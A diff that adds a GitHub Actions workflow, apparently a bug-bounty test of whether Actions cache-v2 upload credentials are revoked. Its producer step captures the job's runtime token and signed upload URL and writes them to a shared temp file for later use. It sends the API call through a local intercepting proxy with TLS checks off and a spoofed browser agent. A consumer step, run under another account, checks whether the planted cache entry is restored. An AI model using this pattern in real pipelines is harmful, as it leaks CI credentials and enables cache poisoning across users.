@@ -1,0 +1,210 @@
+name: bb-cache-v2-revocation
+run-name: bb-cache-v2-${{ inputs.mode }}
+
+"on":
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: Controlled cache-v2 phase
+        required: true
+        type: choice
+        options:
+          - control-producer
+          - control-consumer
+          - candidate-producer
+          - candidate-consumer
+
+permissions:
+  contents: read
+
+jobs:
+  cache-v2-boundary:
+    name: cache-v2-boundary
+    runs-on: [self-hosted, macOS, ARM64, bb-cache-v2-c59831ece103]
+    timeout-minutes: 10
+    env:
+      BB_MODE: ${{ inputs.mode }}
+      BB_RUN_ID: ${{ github.run_id }}
+      BB_ACTOR: ${{ github.actor }}
+      BB_HANDOFF_ROOT: /private/tmp/github-actions-cache-v2-revocation-20260811/c59831ece103
+      BB_CONTROL_KEY: bb-cache-v2-control-20260811-c59831ece103
+      BB_CANDIDATE_KEY: bb-cache-v2-candidate-20260811-c59831ece103
+      BB_CACHE_VERSION: 132ee2e5c147914695ce68fb20c26bfb23a41325bd902bef6700bd28c554f697
+      BB_CONTROL_MARKER: bb-cache-v2-control-marker:c59831ece103
+      BB_CANDIDATE_MARKER: bb-cache-v2-candidate-marker:c59831ece103
+      BB_RESTORE_KEY: ${{ inputs.mode == 'control-consumer' && 'bb-cache-v2-control-20260811-c59831ece103' || 'bb-cache-v2-candidate-20260811-c59831ece103' }}
+    steps:
+      - name: Reserve exact cache-v2 entry
+        if: ${{ endsWith(inputs.mode, '-producer') }}
+        shell: bash
+        run: |
+          ruby <<'RUBY'
+          require "digest"
+          require "fileutils"
+          require "json"
+          require "net/http"
+          require "openssl"
+          require "time"
+          require "uri"
+
+          mode = ENV.fetch("BB_MODE")
+          run_id = Integer(ENV.fetch("BB_RUN_ID"), 10)
+          abort "mode drift" unless ["control-producer", "candidate-producer"].include?(mode)
+          abort "actor drift" unless ENV.fetch("BB_ACTOR") == "masonghbb"
+          key = mode == "control-producer" ? ENV.fetch("BB_CONTROL_KEY") : ENV.fetch("BB_CANDIDATE_KEY")
+          marker = mode == "control-producer" ? ENV.fetch("BB_CONTROL_MARKER") : ENV.fetch("BB_CANDIDATE_MARKER")
+          marker = marker + "\n"
+          version = ENV.fetch("BB_CACHE_VERSION")
+          abort "cache version drift" unless version.match?(/\A[0-9a-f]{64}\z/)
+          handoff = File.join(ENV.fetch("BB_HANDOFF_ROOT"), mode)
+          FileUtils.mkdir_p(handoff, mode: 0o700)
+          File.chmod(0o700, handoff)
+          capsule_path = File.join(handoff, "capsule.json")
+          ready_path = File.join(handoff, "ready.json")
+          failure_path = File.join(handoff, "failure.json")
+          release_path = File.join(handoff, "release.json")
+          abort "stale handoff" if [capsule_path, ready_path, failure_path, release_path].any? { |item| File.exist?(item) }
+
+          workspace = ENV.fetch("GITHUB_WORKSPACE")
+          payload = File.join(workspace, "bb-cache-v2-payload")
+          FileUtils.mkdir_p(payload)
+          marker_path = File.join(payload, "marker.txt")
+          File.write(marker_path, marker, mode: "w", perm: 0o600)
+          manifest = File.join(handoff, "manifest.txt")
+          File.write(manifest, "bb-cache-v2-payload\n", mode: "w", perm: 0o600)
+          archive = File.join(handoff, "cache.tgz")
+          command = [
+            "/usr/bin/tar", "--posix", "-czf", archive,
+            "-P", "-C", workspace, "--files-from", manifest
+          ]
+          abort "archive creation failed" unless system(*command, out: File::NULL, err: File::NULL)
+          archive_size = File.size(archive)
+          abort "archive size drift" unless archive_size.positive? && archive_size < 1_048_576
+
+          results = URI(ENV.fetch("ACTIONS_RESULTS_URL"))
+          abort "results URL drift" unless results.is_a?(URI::HTTPS) &&
+                                            results.userinfo.nil? && results.fragment.nil? &&
+                                            results.port == 443 &&
+                                            results.host.to_s.end_with?(".actions.githubusercontent.com")
+          create_uri = URI(results.scheme + "://" + results.host + "/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry")
+          request_body = JSON.generate("key" => key, "version" => version)
+          request = Net::HTTP::Post.new(create_uri.request_uri)
+          request["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+          request["Content-Type"] = "application/json"
+          request["Authorization"] = "Bearer " + ENV.fetch("ACTIONS_RUNTIME_TOKEN")
+          request.body = request_body
+          requested_at = Time.now.utc
+          http = Net::HTTP::Proxy("127.0.0.1", 8083).new(create_uri.host, create_uri.port)
+          http.use_ssl = true
+          http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+          http.open_timeout = 15
+          http.read_timeout = 30
+          response = http.request(request)
+          code = response.code.to_i
+          unless code == 200
+            File.write(
+              failure_path,
+              JSON.generate("stage" => "CreateCacheEntry", "status" => code) + "\n",
+              mode: "w",
+              perm: 0o600
+            )
+            abort "CreateCacheEntry failed"
+          end
+          body = JSON.parse(response.body)
+          signed_upload_url = body["signedUploadUrl"]
+          upload = URI(signed_upload_url.to_s)
+          abort "signed upload URL drift" unless body["ok"] == true &&
+                                                  upload.is_a?(URI::HTTPS) &&
+                                                  upload.userinfo.nil? && upload.fragment.nil? &&
+                                                  upload.port == 443 &&
+                                                  upload.host.to_s.end_with?(".blob.core.windows.net") &&
+                                                  !upload.query.to_s.empty?
+          capsule = {
+            "mode" => mode,
+            "run_id" => run_id,
+            "key" => key,
+            "version" => version,
+            "marker_sha256" => Digest::SHA256.hexdigest(marker),
+            "archive_path" => archive,
+            "archive_size" => archive_size,
+            "archive_sha256" => Digest::SHA256.file(archive).hexdigest,
+            "results_url" => results.scheme + "://" + results.host + "/",
+            "runtime_token" => ENV.fetch("ACTIONS_RUNTIME_TOKEN"),
+            "signed_upload_url" => signed_upload_url
+          }
+          temporary = capsule_path + ".tmp-" + Process.pid.to_s
+          File.write(temporary, JSON.generate(capsule) + "\n", mode: "w", perm: 0o600)
+          File.rename(temporary, capsule_path)
+          request["Authorization"] = "[REDACTED]"
+          request_body.replace("0" * request_body.bytesize)
+          signed_upload_url.replace("0" * signed_upload_url.bytesize)
+          body.clear
+          ready = {
+            "mode" => mode,
+            "run_id" => run_id,
+            "key_sha256" => Digest::SHA256.hexdigest(key),
+            "version" => version,
+            "archive_size" => archive_size,
+            "archive_sha256" => capsule["archive_sha256"],
+            "create_status" => code,
+            "create_host" => create_uri.host,
+            "create_path" => create_uri.path,
+            "requested_at" => requested_at.iso8601(6),
+            "runtime_token_output" => false,
+            "signed_url_output" => false
+          }
+          File.write(ready_path, JSON.generate(ready) + "\n", mode: "w", perm: 0o600)
+          loop do
+            if File.file?(release_path)
+              release = JSON.parse(File.read(release_path))
+              abort "release drift" unless release == {
+                "mode" => mode,
+                "run_id" => run_id,
+                "disposition" => "finalized"
+              }
+              break
+            end
+            sleep 1
+          end
+          RUBY
+      - name: Prepare clean consumer workspace
+        if: ${{ endsWith(inputs.mode, '-consumer') }}
+        shell: bash
+        run: |
+          ruby <<'RUBY'
+          require "fileutils"
+          mode = ENV.fetch("BB_MODE")
+          abort "mode drift" unless ["control-consumer", "candidate-consumer"].include?(mode)
+          abort "actor drift" unless ENV.fetch("BB_ACTOR") == "masonhck357"
+          path = File.join(ENV.fetch("GITHUB_WORKSPACE"), "bb-cache-v2-payload")
+          FileUtils.rm_rf(path)
+          abort "consumer workspace cleanup drift" if File.exist?(path)
+          RUBY
+      - name: Restore exact cache
+        if: ${{ endsWith(inputs.mode, '-consumer') }}
+        id: restore
+        uses: actions/cache/restore@0400d5f644dc74513175e3cd8d07132dd4860809
+        env:
+          PATH: /usr/bin:/bin:/usr/sbin:/sbin
+        with:
+          path: bb-cache-v2-payload
+          key: ${{ env.BB_RESTORE_KEY }}
+      - name: Verify exact cache marker
+        if: ${{ endsWith(inputs.mode, '-consumer') }}
+        shell: bash
+        env:
+          BB_CACHE_HIT: ${{ steps.restore.outputs.cache-hit }}
+        run: |
+          ruby <<'RUBY'
+          require "digest"
+          mode = ENV.fetch("BB_MODE")
+          abort "mode drift" unless ["control-consumer", "candidate-consumer"].include?(mode)
+          abort "actor drift" unless ENV.fetch("BB_ACTOR") == "masonhck357"
+          marker = mode == "control-consumer" ? ENV.fetch("BB_CONTROL_MARKER") : ENV.fetch("BB_CANDIDATE_MARKER")
+          path = File.join(ENV.fetch("GITHUB_WORKSPACE"), "bb-cache-v2-payload", "marker.txt")
+          expected = marker + "\n"
+          abort "cache miss" unless ENV.fetch("BB_CACHE_HIT", "") == "true"
+          abort "marker missing" unless File.file?(path)
+          actual = File.binread(path)
+          abort "marker digest drift" unless Digest::SHA256.hexdigest(actual) == Digest::SHA256.hexdigest(expected)
+          RUBY
